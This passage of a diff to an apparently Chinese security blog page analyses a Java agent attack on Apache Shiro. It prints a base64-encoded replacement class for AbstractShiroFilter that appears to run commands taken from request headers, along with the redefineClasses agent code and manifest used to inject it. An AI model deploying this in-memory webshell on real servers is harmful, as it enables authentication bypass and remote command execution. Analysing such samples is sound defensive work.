mFnZXI7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWAQAPYnVpbGRXZWJTdWJqZWN0AQArKClMb3JnL2FwYWNoZS9zaGlyby93ZWIvc3ViamVjdC9XZWJTdWJqZWN0OwEACmdldFN1YmplY3QBACQoKUxvcmcvYXBhY2hlL3NoaXJvL3N1YmplY3QvU3ViamVjdDsBAApnZXRTZXNzaW9uAQAlKFopTG9yZy9hcGFjaGUvc2hpcm8vc2Vzc2lvbi9TZXNzaW9uOwEABXRvdWNoAQAFZXJyb3IBACooTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9UaHJvd2FibGU7KVYBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BAAlnZXRIZWFkZXIBAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAdpbmRleE9mAQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEAE3JlZGlyZWN0RXJyb3JTdHJlYW0BAB0oWilMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAEcmVhZAEABShbQilJAQAFd3JpdGUBAAcoW0JJSSlWAQAFZmx1c2gBAA9nZXRPdXRwdXRTdHJlYW0BACUoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRPdXRwdXRTdHJlYW07AQAZKExqYXZhL2lvL091dHB1dFN0cmVhbTspVgEAC3RvQnl0ZUFycmF5AQAEKClbQgEABShbQilWAQAFY2xvc2UBAI0oTG9yZy9hcGFjaGUvc2hpcm8vd2ViL3NlcnZsZXQvQWJzdHJhY3RTaGlyb0ZpbHRlcjtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMa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&#34;</span><span class="o">);</span>
+          <span class="n">ClassDefinition</span> <span class="n">classDefinition</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ClassDefinition</span><span class="o">(</span><span class="n">clazz</span><span class="o">,</span> <span class="n">arrayOfByte</span><span class="o">);</span>
+          <span class="k">try</span> <span class="o">{</span>
+            <span class="n">paramInstrumentation</span><span class="o">.</span><span class="na">redefineClasses</span><span class="o">(</span><span class="k">new</span> <span class="n">ClassDefinition</span><span class="o">[]</span> <span class="o">{</span> <span class="n">classDefinition</span> <span class="o">});</span>
+          <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+          <span class="o">}</span>
+        <span class="o">}</span>
+      <span class="o">}</span>
+    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{}</span>
+  <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
 </div>
 </div><p>agent.jar/META-INF/MANIFEST.MF：</p>
 <div class="highlight"><div class="chroma">
@@ -899,12 +899,12 @@
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-MF" data-lang="MF"><span class="line"><span class="cl"><span class="nf">Manifest-Version</span><span class="o">:</span> 1.0
-</span></span><span class="line"><span class="cl"><span class="nf">Can-Redefine-Classes</span><span class="o">:</span> <span class="n">true</span>
-</span></span><span class="line"><span class="cl"><span class="nf">Agent-Class</span><span class="o">:</span> <span class="n">HotSwapAgent</span>
-</span></span><span class="line"><span class="cl"><span class="nf">Premain-Class</span><span class="o">:</span> <span class="n">HotSwapAgent</span>
-</span></span><span class="line"><span class="cl"><span class="nf">Can-Retransform-Classes</span><span class="o">:</span> <span class="n">true</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-MF" data-lang="MF"><span class="nf">Manifest-Version</span><span class="o">:</span> 1.0
+<span class="nf">Can-Redefine-Classes</span><span class="o">:</span> <span class="n">true</span>
+<span class="nf">Agent-Class</span><span class="o">:</span> <span class="n">HotSwapAgent</span>
+<span class="nf">Premain-Class</span><span class="o">:</span> <span class="n">HotSwapAgent</span>
+<span class="nf">Can-Retransform-Classes</span><span class="o">:</span> <span class="n">true</span>
+</code></pre></td></tr></table>
 </div>
 </div><p>作者用自定义类替换 “org.apache.shiro.web.servlet.AbstractShiroFilter”，企图绕过鉴权。</p>
 <h2 id="写在后面">写在后面</h2>
